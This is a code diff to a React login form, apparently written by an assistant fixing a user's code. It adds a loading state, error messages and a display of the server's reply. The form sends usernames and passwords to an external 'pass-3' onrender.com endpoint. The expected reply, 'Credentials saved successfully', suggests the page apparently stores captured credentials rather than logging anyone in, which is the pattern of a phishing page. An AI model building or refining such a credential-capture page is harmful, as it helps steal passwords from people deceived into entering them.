@@ -6,18 +6,26 @@ const Login = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [message, setMessage] = useState('');
+  const [loading, setLoading] = useState(false); // Added for better UX
 
   const handleSubmit = async (e) => {
     e.preventDefault();
+    setLoading(true); // Disable the button
+    setMessage('');   // Clear any previous messages
+
     try {
       const res = await axios.post('https://pass-3.onrender.com/api/login', {
         username,
         password,
       });
-      setMessage(res.data.message);
+      // This line works, but you weren't displaying the message
+      setMessage(res.data.message); 
     } catch (error) {
-      setMessage('Error occurred');
+      // This will show if the server is down or there's a network error
+      setMessage('Error: Could not connect to the server.');
       console.error(error);
+    } finally {
+      setLoading(false); // Re-enable the button
     }
   };
 
@@ -25,7 +33,6 @@ const Login = () => {
     <div style={styles.container}>
       <div style={styles.languageSelector}>English (India)</div>
       <div style={styles.loginContainer}>
-        {/* Replace the src with your desired logo */}
         <img
           src="logo1.jpeg.jpg" 
           alt="Logo"
@@ -48,8 +55,15 @@ const Login = () => {
             required
             style={styles.input}
           />
-          <button type="submit" style={styles.loginButton}>
-            Log in
+
+          {/* ================================================================= */}
+          {/* THE FIX IS HERE: This line displays the message to the user      */}
+          {/* It will show 'Credentials saved successfully' after you click   */}
+          {/* ================================================================= */}
+          {message && <p style={styles.message}>{message}</p>}
+          
+          <button type="submit" style={styles.loginButton} disabled={loading}>
+            {loading ? 'Logging in...' : 'Log in'}
           </button>
         </form>
         <a href="#" style={styles.forgotPassword}>
@@ -63,6 +77,8 @@ const Login = () => {
     </div>
   );
 };
+
+// --- STYLES (with an added style for the message) ---
 
 const styles = {
   container: {
@@ -112,6 +128,13 @@ const styles = {
     borderRadius: '6px',
     fontWeight: 'bold',
     cursor: 'pointer',
+  },
+  // Added style for the message
+  message: {
+    textAlign: 'center',
+    color: 'green', // Green for success
+    fontWeight: 'bold',
+    marginBottom: '10px',
   },
   forgotPassword: {
     marginTop: '20px',
